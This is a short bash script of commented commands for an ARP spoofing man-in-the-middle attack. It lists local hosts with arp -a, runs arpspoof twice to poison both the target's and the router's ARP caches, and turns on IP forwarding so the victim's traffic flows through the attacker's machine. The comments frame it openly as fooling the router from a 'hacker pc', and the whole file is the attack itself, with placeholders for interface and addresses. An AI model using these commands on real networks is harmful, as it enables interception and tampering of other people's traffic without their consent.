#!/bin/bash
#To find ips with mac address
arp -a 

#Spoofing pretend to be another computer and fooling router
arpspoof -i interface -t targetip routerip

#Making a fake router to fool the target pc
arpspoof -i interface -t routerip targetip

#Enable port forwarding from hacker pc, to let packets to follow through like router
echo 1 > /proc/sys/net/ipv4/ip_forward
